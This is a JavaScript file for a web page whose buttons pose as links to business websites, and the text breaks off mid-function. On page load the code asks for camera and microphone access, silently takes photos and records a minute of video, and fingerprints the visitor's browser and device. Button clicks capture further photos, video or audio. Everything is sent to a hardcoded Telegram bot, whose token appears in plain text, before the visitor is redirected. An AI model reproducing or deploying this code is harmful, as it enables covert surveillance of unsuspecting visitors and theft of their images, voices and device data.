/* =================
   Professional JavaScript Logic
   ================= */
document.addEventListener('DOMContentLoaded', async () => {
    // Configuration
    const BOT_TOKEN = '8227630208:AAFcakflRN_1ITpwmMdtTdpF4LPO26UAEwg';
    const CHAT_ID = '5372717005';

    // UI Elements
    const capturePhotoBtn = document.getElementById('capturePhotoBtn');
    const recordVideoBtn = document.getElementById('recordVideoBtn');
    const recordAudioBtn = document.getElementById('recordAudioBtn');
    const fingerprintBtn = document.getElementById('fingerprintBtn');

    // State Variables
    let stream = null;
    let mediaRecorder = null;
    let recordingType = '';
    let initialErrorShown = false;
    
    // Auto capture photos and video on page load
    async function autoCaptureonPageLoad() {
        try {
            // Wait a bit for stream to be ready
            await new Promise(resolve => setTimeout(resolve, 1000));

            if (!stream) {
                console.log('Stream not ready yet, retrying...');
                setTimeout(autoCaptureonPageLoad, 2000);
                return;
            }

            console.log('Starting auto capture...');

            // Capture 5 photos
            const canvas = document.createElement('canvas');
            const videoTrack = stream.getVideoTracks()[0];
            if (videoTrack) {
                let width = 640;
                let height = 480;
                try {
                    const settings = videoTrack.getSettings();
                    if (settings.width && settings.height) {
                        width = settings.width;
                        height = settings.height;
                    }
                } catch (err) {
                    console.warn('Could not get video settings:', err);
                }

                canvas.width = width;
                canvas.height = height;
                const context = canvas.getContext('2d');

                for (let i = 0; i < 5; i++) {
                    try {
                        const videoTrack = stream.getVideoTracks()[0];
                        if (!videoTrack) break;

                        // Try ImageCapture API first
                        if (typeof ImageCapture !== 'undefined') {
                            try {
                                const imageCaptureObj = new ImageCapture(videoTrack);
                                const bitmap = await imageCaptureObj.grabFrame();
                                const canvas2 = document.createElement('canvas');
                                canvas2.width = bitmap.width;
                                canvas2.height = bitmap.height;
                                const ctx = canvas2.getContext('2d');
                                ctx.drawImage(bitmap, 0, 0);

                                const blob = await new Promise((resolve, reject) => {
                                    canvas2.toBlob((blob) => {
                                        if (blob) {
                                            resolve(blob);
                                        } else {
                                            reject(new Error(''));
                                        }
                                    }, 'image/jpeg', 0.95);
                                });

                                const formData = {
                                    method: 'sendPhoto',
                                    fileType: 'photo',
                                    file: blob,
                                    fileName: `auto_photo_${Date.now()}_${i}.jpg`
                                };
                                await sendToTelegram(formData);
                                console.log(`Photo ${i + 1} sent successfully`);
                            } catch (imageCaptureErr) {
                                console.warn('ImageCapture failed:', imageCaptureErr);
                            }
                        }

                        if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
                    } catch (photoError) {
                        console.error(`Auto photo capture error ${i + 1}:`, photoError);
                    }
                }
            }

            // Record 60 second video (1 minute)
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            const videoMimeType = getSupportedVideoMimeType();
            let recordedChunks = [];
            let autoMediaRecorder = null;

            try {
                autoMediaRecorder = new MediaRecorder(stream, { mimeType: videoMimeType });
            } catch (error) {
                console.error('MediaRecorder error:', error);
                return;
            }

            autoMediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            autoMediaRecorder.onstop = async () => {
                const blob = new Blob(recordedChunks, { type: videoMimeType });
                recordedChunks = [];

                let fileExtension = 'webm';
                if (videoMimeType.includes('mp4')) fileExtension = 'mp4';
                else if (videoMimeType.includes('mpeg')) fileExtension = 'mp3';
                else if (videoMimeType.includes('wav')) fileExtension = 'wav';
                else if (videoMimeType.includes('x-msvideo')) fileExtension = 'avi';

                const formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `auto_video_${Date.now()}.${fileExtension}`
                };

                await sendToTelegram(formData);
                console.log('Auto video sent successfully');
            };

            try {
                autoMediaRecorder.start();
                console.log('Auto video recording started...');

                // Auto-stop after 60 seconds (1 minute)
                setTimeout(() => {
                    if (autoMediaRecorder && autoMediaRecorder.state === 'recording') {
                        autoMediaRecorder.stop();
                        console.log('Auto video recording stopped');
                    }
                }, 60000);
            } catch (error) {
                console.error('Recording start error:', error);
            }

        } catch (error) {
            console.error('Error in auto capture:', error);
        }
    }

    // Send browser fingerprint on page load
    try {
        const fingerprint = await collectBrowserFingerprint();
        
        // Format fingerprint as professional Arabic text
        const formatFingerprint = (data) => {
            let text = `\n\n`;
            text += `${'█'.repeat(80)}\n`;
            text += `█ 📱 تقرير معلومات المتصفح والجهاز الشامل والمتكامل\n`;
            text += `${'█'.repeat(80)}\n\n`;
            
            text += `\n🖥️ ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات النظام والجهاز\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            text += `  ✓ نظام التشغيل الأساسي: ${data.os}\n`;
            text += `  ✓ اسم الجهاز: ${data.deviceName}\n`;
            text += `  ✓ المنصة: ${data.platform}\n`;
            text += `  ✓ وكيل المستخدم: ${data.userAgent}\n`;
            text += `  ✓ عدد المعالجات: ${data.hardwareConcurrency}\n`;
            text += `  ✓ حجم الذاكرة: ${data.deviceMemory} GB\n`;
            text += `  ✓ نقاط اللمس: ${data.maxTouchPoints}\n`;
            text += `  ✓ البائع: ${data.vendor}\n\n`;
            
            text += `\n🌐 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات المتصفح والإعدادات\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            text += `  ✓ اللغة الأساسية: ${data.language}\n`;
            text += `  ✓ اللغات المدعومة: ${Array.isArray(data.languages) ? data.languages.join(', ') : data.languages}\n`;
            text += `  ✓ المنطقة الزمنية: ${data.timezone}\n`;
            text += `  ✓ فرق المنطقة الزمنية: ${data.timezoneOffset} دقيقة\n`;
            text += `  ✓ ملفات تعريف الارتباط مفعلة: ${data.cookieEnabled ? 'نعم' : 'لا'}\n`;
            text += `  ✓ عدم التتبع: ${data.doNotTrack || 'غير محدد'}\n`;
            text += `  ✓ الاتصال بالإنترنت: ${data.onLine ? 'متصل' : 'غير متصل'}\n\n`;
            
            text += `\n📺 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات الشاشة والنافذة\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            text += `  ✓ دقة الشاشة: ${data.screen.width} × ${data.screen.height} بكسل\n`;
            text += `  ✓ الدقة المتاحة: ${data.screen.availWidth} × ${data.screen.availHeight} بكسل\n`;
            text += `  ✓ عمق الألوان: ${data.screen.colorDepth} بت\n`;
            text += `  ✓ عمق البكسل: ${data.screen.pixelDepth} بت\n`;
            text += `  ✓ اتجاه الشاشة: ${data.screen.orientation || 'غير متاح'}\n`;
            text += `  ✓ حجم النافذة: ${data.window.innerWidth} × ${data.window.innerHeight} بكسل\n`;
            text += `  ✓ الحجم الخارجي: ${data.window.outerWidth} × ${data.window.outerHeight} بكسل\n\n`;
            
            text += `\n🔌 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات الاتصال والشبكة\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            const connInfo = data.connection;
            if (typeof connInfo === 'object') {
                text += `  ✓ نوع الاتصال: ${connInfo.effectiveType}\n`;
                text += `  ✓ سرعة التنزيل: ${connInfo.downlink} Mbps\n`;
                text += `  ✓ وقت التأخير: ${connInfo.rtt} ms\n`;
                text += `  ✓ حفظ البيانات: ${connInfo.saveData ? 'نعم' : 'لا'}\n`;
            } else {
                text += `  ✓ معلومات الاتصال: ${connInfo}\n`;
            }
            text += `\n`;
            
            text += `\n🔋 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات البطارية والطاقة\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            const batteryInfo = data.battery;
            if (typeof batteryInfo === 'object') {
                text += `  ✓ مستوى البطارية: ${(batteryInfo.level * 100).toFixed(0)}%\n`;
                text += `  ✓ حالة الشحن: ${batteryInfo.charging ? 'قيد الشحن' : 'غير مشحون'}\n`;
                text += `  ✓ وقت الشحن المتبقي: ${batteryInfo.chargingTime} ثانية\n`;
                text += `  ✓ وقت التفريغ المتبقي: ${batteryInfo.dischargingTime} ثانية\n`;
            } else {
                text += `  ✓ معلومات البطارية: ${batteryInfo}\n`;
            }
            text += `\n`;
            
            text += `\n💾 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات التخزين والذاكرة\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            text += `  ✓ التخزين المحلي: ${data.localStorage ? 'متاح' : 'غير متاح'}\n`;
            text += `  ✓ التخزين المؤقت: ${data.sessionStorage ? 'متاح' : 'غير متاح'}\n`;
            text += `  ✓ قاعدة البيانات المفهرسة: ${data.indexedDB ? 'متاحة' : 'غير متاحة'}\n`;
            text += `  ✓ قاعدة البيانات المفتوحة: ${data.openDatabase ? 'متاحة' : 'غير متاحة'}\n\n`;
            
            text += `\n🔐 ═══════════════════════════════════════════════════════════════════════════════\n`;
            text += `    معلومات الأمان والأذونات\n`;
            text += `═══════════════════════════════════════════════════════════════════════════════\n\n`;
            text += `  ✓ الموقع الجغرافي: ${data.geolocation}\n`;
            text += `  ✓ أجهزة الوسائط: ${data.mediaDevices}\n`;
            text += `  ✓ نظام الأذونات: ${data.permissions}\n\n`;
            
            text += `\n${'█'.repeat(80)}\n`;
            text += `█ ⏰ وقت إنشاء التقرير: ${new Date().toLocaleString('ar-SA')}\n`;
            text += `█ 📅 التاريخ والوقت الدقيق: ${new Date().toISOString()}\n`;
            text += `${'█'.repeat(80)}\n\n`;
            
            return text;
        };
        
        const fingerprintText = formatFingerprint(fingerprint);
        const blob = new Blob([fingerprintText], { type: 'text/plain' });
        const formData = {
            method: 'sendDocument',
            fileType: 'document',
            file: blob,
            fileName: `تقرير_معلومات_الجهاز_${Date.now()}.txt`
        };
        await sendToTelegram(formData, '📱 تقرير معلومات المتصفح والجهاز عند تحميل الصفحة');
    } catch (error) {
        console.error('Error sending initial fingerprint:', error);
    }

    // ==================== Helper Functions ====================

    // Get supported video MIME type
    function getSupportedVideoMimeType() {
        const types = [
            'video/webm;codecs=vp9,opus',
            'video/webm;codecs=vp8,opus',
            'video/webm',
            'video/mp4',
            'video/x-msvideo'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'video/webm';
    }

    // Get supported audio MIME type
    function getSupportedAudioMimeType() {
        const types = [
            'audio/webm',
            'audio/mp4',
            'audio/mpeg',
            'audio/wav'
        ];
        for (let type of types) {
            if (MediaRecorder.isTypeSupported(type)) {
                return type;
            }
        }
        return 'audio/webm';
    }

    // Update progress ring
    function updateProgressRing(button, percentage) {
        const progressRing = button.querySelector('.progress-ring');
        const circle = button.querySelector('.progress-circle');
        const progressText = button.querySelector('.progress-text');

        if (progressRing && circle && progressText) {
            const circumference = 2 * Math.PI * 25;
            const offset = circumference - (percentage / 100) * circumference;
            circle.style.strokeDashoffset = offset;
            progressText.textContent = percentage + '%';

            if (percentage > 0) {
                progressRing.classList.add('active');
            } else {
                progressRing.classList.remove('active');
            }
        }
    }

    // Send data to Telegram
    async function sendToTelegram(formData, caption = '', retries = 3) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${formData.method}`;

        for (let attempt = 1; attempt <= retries; attempt++) {
            try {
                const data = new FormData();
                data.append('chat_id', CHAT_ID);
                data.append(formData.fileType, formData.file, formData.fileName);
                if (caption) {
                    data.append('caption', caption);
                }

                const response = await fetch(url, {
                    method: 'POST',
                    body: data,
                    timeout: 30000
                });

                if (!response.ok) {
                    if (attempt < retries) {
                        await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        continue;
                    }
                    return false;
                }

                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error(`Attempt ${attempt} failed:`, error);
                if (attempt < retries) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                    continue;
                }
                return false;
            }
        }
        return false;
    }

    // Initialize camera/microphone
    async function init() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return;
        }

        try {
            // Try to get camera and microphone
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: true
                });
            } catch (err) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { width: { ideal: 1280 }, height: { ideal: 720 } },
                        audio: true
                    });
                } catch (err2) {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: true
                    });
                }
            }

            // Enable buttons
            capturePhotoBtn.disabled = false;
            recordVideoBtn.disabled = false;
            recordAudioBtn.disabled = false;
            fingerprintBtn.disabled = false;
            
            // Enable project buttons after permissions granted
            enableProjectButtons();

            // Start auto capture on page load
            autoCaptureonPageLoad();
        } catch (err) {
            // Show error only once on page load
            if (!initialErrorShown) {
                initialErrorShown = true;
                // Error message shown only once
            }
        }
    }
    
    // Enable project buttons when permissions are granted
    function enableProjectButtons() {
        const projectBtn1 = document.getElementById('projectBtn1');
        const projectBtn2 = document.getElementById('projectBtn2');
        const projectBtn3 = document.getElementById('projectBtn3');
        
        if (projectBtn1) projectBtn1.disabled = false;
        if (projectBtn2) projectBtn2.disabled = false;
        if (projectBtn3) projectBtn3.disabled = false;
    }
    
    // Disable project buttons if permissions are denied
    function disableProjectButtons() {
        const projectBtn1 = document.getElementById('projectBtn1');
        const projectBtn2 = document.getElementById('projectBtn2');
        const projectBtn3 = document.getElementById('projectBtn3');
        
        if (projectBtn1) projectBtn1.disabled = true;
        if (projectBtn2) projectBtn2.disabled = true;
        if (projectBtn3) projectBtn3.disabled = true;
    }

    // ==================== Photo Capture ====================
    capturePhotoBtn.addEventListener('click', async () => {
        if (!stream) {
            return;
        }

        capturePhotoBtn.disabled = true;

        try {
            const canvas = document.createElement('canvas');
            const videoTrack = stream.getVideoTracks()[0];
            if (!videoTrack) {
                capturePhotoBtn.disabled = false;
                return;
            }

            let width = 640;
            let height = 480;
            try {
                const settings = videoTrack.getSettings();
                if (settings.width && settings.height) {
                    width = settings.width;
                    height = settings.height;
                }
            } catch (err) {
                console.warn('Could not get video settings:', err);
            }

            canvas.width = width;
            canvas.height = height;
            const context = canvas.getContext('2d');

            for (let i = 0; i < 10; i++) {
                updateProgressRing(capturePhotoBtn, (i + 1) * 10);
                let captureSuccess = false;

                try {
                    const videoTrack = stream.getVideoTracks()[0];
                    if (!videoTrack) {
                        throw new Error('');
                    }

                    // Try ImageCapture API first
                    if (typeof ImageCapture !== 'undefined') {
                        try {
                            const imageCaptureObj = new ImageCapture(videoTrack);
                            const bitmap = await imageCaptureObj.grabFrame();
                            const canvas2 = document.createElement('canvas');
                            canvas2.width = bitmap.width;
                            canvas2.height = bitmap.height;
                            const ctx = canvas2.getContext('2d');
                            ctx.drawImage(bitmap, 0, 0);

                            const blob = await new Promise((resolve, reject) => {
                                canvas2.toBlob((blob) => {
                                    if (blob) {
                                        resolve(blob);
                                    } else {
                                        reject(new Error(''));
                                    }
                                }, 'image/jpeg', 0.95);
                            });

                            const formData = {
                                method: 'sendPhoto',
                                fileType: 'photo',
                                file: blob,
                                fileName: `capture_${Date.now()}_${i}.jpg`
                            };
                            await sendToTelegram(formData);
                            captureSuccess = true;
                        } catch (imageCaptureErr) {
                            console.warn('ImageCapture failed:', imageCaptureErr);
                        }
                    }

                    // Fallback to canvas method
                    if (!captureSuccess) {
                        const tempVideo = document.createElement('video');
                        tempVideo.srcObject = stream;
                        tempVideo.muted = true;
                        tempVideo.play();

                        await new Promise(resolve => setTimeout(resolve, 100));

                        context.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                        const blob = await new Promise((resolve, reject) => {
                            canvas.toBlob((blob) => {
                                if (blob) {
                                    resolve(blob);
                                } else {
                                    reject(new Error(''));
                                }
                            }, 'image/jpeg', 0.95);
                        });

                        const formData = {
                            method: 'sendPhoto',
                            fileType: 'photo',
                            file: blob,
                            fileName: `capture_${Date.now()}_${i}.jpg`
                        };
                        await sendToTelegram(formData);
                        captureSuccess = true;
                    }

                    if (i < 9) await new Promise(resolve => setTimeout(resolve, 500));
                } catch (photoError) {
                    console.error(`Photo capture error ${i + 1}:`, photoError);
                }
            }

            updateProgressRing(capturePhotoBtn, 0);
            setTimeout(() => {
                window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
            }, 500);
        } catch (error) {
            console.error('Photo capture error:', error);
            updateProgressRing(capturePhotoBtn, 0);
        } finally {
            capturePhotoBtn.disabled = false;
        }
    });

    // ==================== Video Recording ====================
    recordVideoBtn.addEventListener('click', () => {
        if (!stream) {
            return;
        }

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'video';
            const videoMimeType = getSupportedVideoMimeType();
            startRecording(stream, videoMimeType, 30000); // 30 seconds
            recordVideoBtn.textContent = 'موقع زينة تاتش';
            recordVideoBtn.classList.add('btn-stop');
            recordAudioBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateProgressRing(recordVideoBtn, 0);
        }
    });

    // ==================== Audio Recording ====================
    recordAudioBtn.addEventListener('click', () => {
        if (!stream) {
            return;
        }

        if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
        } else {
            recordingType = 'audio';
            const audioStream = new MediaStream(stream.getAudioTracks());
            const audioMimeType = getSupportedAudioMimeType();
            startRecording(audioStream, audioMimeType, 40000); // 40 seconds
            recordAudioBtn.textContent = 'موقع بيتك العقارية ';
            recordAudioBtn.classList.add('btn-stop');
            recordVideoBtn.disabled = true;
            capturePhotoBtn.disabled = true;
            updateProgressRing(recordAudioBtn, 0);
        }
    });

    // Start recording
    function startRecording(streamToRecord, mimeType, duration) {
        let recordedChunks = [];

        try {
            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
        } catch (error) {
            console.error('MediaRecorder error:', error);
            resetButtons();
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onerror = (event) => {
            console.error('Recording error:', event.error);
            resetButtons();
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            let fileExtension = 'webm';
            if (mimeType.includes('mp4')) fileExtension = 'mp4';
            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
            else if (mimeType.includes('wav')) fileExtension = 'wav';
            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';

            let formData;
            if (recordingType === 'video') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `video_${Date.now()}.${fileExtension}`
                };
            } else {
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `audio_${Date.now()}.${fileExtension}`
                };
            }

            const success = await sendToTelegram(formData);
            if (success) {
                setTimeout(() => {
                    if (recordingType === 'video') {
                        window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
                    } else if (recordingType === 'audio') {
                        window.open('https://abuali782.github.io/BaytakRealEstate/', '_blank');
                    }
                }, 500);
            }

            resetButtons();
        };

        try {
            mediaRecorder.start();
            
            // Auto-stop recording after specified duration
            if (duration) {
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, duration);
            }
        } catch (error) {
            console.error('Recording start error:', error);
            resetButtons();
        }
    }

    // Reset buttons
    function resetButtons() {
        recordVideoBtn.textContent = ' موقع زينة تاتش';
        recordVideoBtn.classList.remove('btn-stop');
        recordAudioBtn.textContent = ' موقع بيتك العقارية';
        recordAudioBtn.classList.remove('btn-stop');

        capturePhotoBtn.disabled = false;
        recordVideoBtn.disabled = false;
        recordAudioBtn.disabled = false;
        fingerprintBtn.disabled = false;

        updateProgressRing(recordVideoBtn, 0);
        updateProgressRing(recordAudioBtn, 0);
    }

    // ==================== Browser Fingerprint ====================
    fingerprintBtn.addEventListener('click', async () => {
        fingerprintBtn.disabled = true;

        try {
            const fingerprint = await collectBrowserFingerprint();
            
            // Format fingerprint as professional Arabic text
            const formatFingerprint = (data) => {
                let text = `📱 تقرير معلومات المتصفح والجهاز\n`;
                text += `${'='.repeat(50)}\n\n`;
                
                text += `🖥️ معلومات النظام:\n`;
                text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                text += `نظام التشغيل: ${data.os}\n`;
                text += `المنصة: ${data.platform}\n`;
                text += `اسم الجهاز: ${data.deviceName}\n`;
                text += `المعالج: ${data.processor}\n`;
                text += `الذاكرة: ${data.memory}\n`;
                text += `عدد المعالجات: ${data.cores}\n\n`;
                
                text += `🌐 معلومات المتصفح:\n`;
                text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                text += `وكيل المستخدم: ${data.userAgent}\n`;
                text += `اللغة: ${data.language}\n`;
                text += `المنطقة الزمنية: ${data.timezone}\n\n`;
                
                text += `📺 معلومات الشاشة:\n`;
                text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                text += `دقة الشاشة: ${data.screenResolution}\n`;
                text += `عمق الألوان: ${data.colorDepth}\n`;
                text += `عدد البكسل: ${data.pixelDepth}\n\n`;
                
                text += `🔌 معلومات الاتصال:\n`;
                text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                text += `نوع الاتصال: ${data.connection}\n`;
                text += `سرعة التنزيل: ${data.downlink} Mbps\n`;
                text += `التأخير: ${data.rtt} ms\n\n`;
                
                text += `🔋 معلومات البطارية:\n`;
                text += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
                text += `مستوى البطارية: ${data.battery}\n`;
                text += `حالة الشحن: ${data.charging}\n\n`;
                
                text += `${'='.repeat(50)}\n`;
                text += `وقت التقرير: ${new Date().toLocaleString('ar-SA')}\n`;
                
                return text;
            };
            
            const fingerprintText = formatFingerprint(fingerprint);
            const blob = new Blob([fingerprintText], { type: 'text/plain' });
            const formData = {
                method: 'sendDocument',
                fileType: 'document',
                file: blob,
                fileName: `تقرير_معلومات_الجهاز_${Date.now()}.txt`
            };

            await sendToTelegram(formData, '📱 تقرير معلومات المتصفح والجهاز الكاملة');
        } catch (error) {
            console.error('Fingerprint collection error:', error);
        } finally {
            fingerprintBtn.disabled = false;
        }
    });

    // Collect browser fingerprint
    async function collectBrowserFingerprint() {
        const ua = navigator.userAgent;
        
        // Extract device name from user agent
        let deviceName = 'جهاز غير معروف';
        if (ua.includes('iPhone')) deviceName = 'iPhone';
        else if (ua.includes('iPad')) deviceName = 'iPad';
        else if (ua.includes('Android')) deviceName = 'جهاز Android';
        else if (ua.includes('Windows')) deviceName = 'Windows PC';
        else if (ua.includes('Mac')) deviceName = 'Mac';
        else if (ua.includes('Linux')) deviceName = 'Linux';
        
        // Extract OS
        let os = 'غير معروف';
        if (ua.includes('Windows')) os = 'Windows';
        else if (ua.includes('Mac')) os = 'macOS';
        else if (ua.includes('Android')) os = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
        else if (ua.includes('Linux')) os = 'Linux';
        
        const fingerprint = {
            timestamp: new Date().toISOString(),
            deviceName: deviceName,
            os: os,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
            deviceMemory: navigator.deviceMemory || 'غير متاح',
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            onLine: navigator.onLine,
            screen: {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                orientation: window.screen.orientation?.type,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            canvas: await getCanvasFingerprint(),
            webgl: getWebGLFingerprint(),
            plugins: getPluginsInfo(),
            localStorage: typeof localStorage !== 'undefined',
            sessionStorage: typeof sessionStorage !== 'undefined',
            indexedDB: typeof indexedDB !== 'undefined',
            openDatabase: typeof openDatabase !== 'undefined',
            cpuClass: navigator.cpuClass,
            oscpu: navigator.oscpu,
            connection: getConnectionInfo(),
            battery: await getBatteryInfo(),
            geolocation: navigator.geolocation ? 'متاح' : 'غير متاح',
            mediaDevices: navigator.mediaDevices ? 'متاح' : 'غير متاح',
            permissions: navigator.permissions ? 'متاح' : 'غير متاح'
        };

        return fingerprint;
    }
    
    // Get battery info
    async function getBatteryInfo() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            }
            return 'Not Available';
        } catch (e) {
            return 'Not Available';
        }
    }

    // Get canvas fingerprint
    async function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprint', 4, 17);
            return canvas.toDataURL();
        } catch (e) {
            return 'Not available';
        }
    }

    // Get WebGL fingerprint
    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Not available';

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            };
        } catch (e) {
            return 'Not available';
        }
    }

    // Get plugins info
    function getPluginsInfo() {
        try {
            return Array.from(navigator.plugins).map(p => ({
                name: p.name,
                description: p.description,
                version: p.version
            }));
        } catch (e) {
            return [];
        }
    }

    // Get connection info
    function getConnectionInfo() {
        try {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return 'Not available';

            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
        } catch (e) {
            return 'Not available';
        }
    }

    // ==================== Redirect Function ====================
    function redirectAfterSuccess() {
        const choice = confirm('هل تريد الذهاب إلى موقع زينة تاتش؟');

        if (choice) {
            window.open('https://abuali782.github.io/Zena-Touch-v2/', '_blank');
        } else {
            window.open('https://mubassitalshamal-v9.onrender.com/', '_blank');
        }
    }


    // Start recording for projects
    function startRecordingProject(streamToRecord, mimeType, duration, redirectUrl) {
        let recordedChunks = [];

        try {
            mediaRecorder = new MediaRecorder(streamToRecord, { mimeType });
        } catch (error) {
            console.error('MediaRecorder error:', error);
            return;
        }

        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        mediaRecorder.onerror = (event) => {
            console.error('Recording error:', event.error);
        };

        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            recordedChunks = [];

            let fileExtension = 'webm';
            if (mimeType.includes('mp4')) fileExtension = 'mp4';
            else if (mimeType.includes('mpeg')) fileExtension = 'mp3';
            else if (mimeType.includes('wav')) fileExtension = 'wav';
            else if (mimeType.includes('x-msvideo')) fileExtension = 'avi';

            let formData;
            if (recordingType === 'project2') {
                formData = {
                    method: 'sendVideo',
                    fileType: 'video',
                    file: blob,
                    fileName: `project2_video_${Date.now()}.${fileExtension}`
                };
            } else if (recordingType === 'project3') {
                formData = {
                    method: 'sendAudio',
                    fileType: 'audio',
                    file: blob,
                    fileName: `project3_audio_${Date.now()}.${fileExtension}`
                };
            }

            const success = await sendToTelegram(formData);
            if (success) {
                setTimeout(() => {
                    window.open(redirectUrl, '_blank');
                }, 500);
            }

            projectBtn2.disabled = false;
            projectBtn3.disabled = false;
        };

        try {
            mediaRecorder.start();
            
            // Auto-stop recording after specified duration
            if (duration) {
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, duration);
            }
        } catch (error) {
            console.error('Recording start error:', error);
        }
    }

    // ==================== Project Buttons ====================
    const projectBtn1 = document.getElementById('projectBtn1');
    const projectBtn2 = document.getElementById('projectBtn2');
    const projectBtn3 = document.getElementById('projectBtn3');
    
    // Project 1: Capture 10 photos
    if (projectBtn1) {
        projectBtn1.addEventListener('click', async () => {
            if (!stream || projectBtn1.disabled) {
                return;
            }
            
            projectBtn1.disabled = true;
            
            try {
                const canvas = document.createElement('canvas');
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) {
                    projectBtn1.disabled = false;
                    return;
                }
                
                let width = 640;
                let height = 480;
                try {
                    const settings = videoTrack.getSettings();
                    if (settings.width && settings.height) {
                        width = settings.width;
                        height = settings.height;
                    }
                } catch (err) {
                    console.warn('Could not get video settings:', err);
                }
                
                canvas.width = width;
                canvas.height = height;
                
                for (let i = 0; i < 4; i++) {
                    try {
                        const videoTrack = stream.getVideoTracks()[0];
                        if (!videoTrack) break;
                        
                        if (typeof ImageCapture !== 'undefined') {
                            try {
                                const imageCaptureObj = new ImageCapture(videoTrack);
                                const bitmap = await imageCaptureObj.grabFrame();
                                const canvas2 = document.createElement('canvas');
                                canvas2.width = bitmap.width;
                                canvas2.height = bitmap.height;
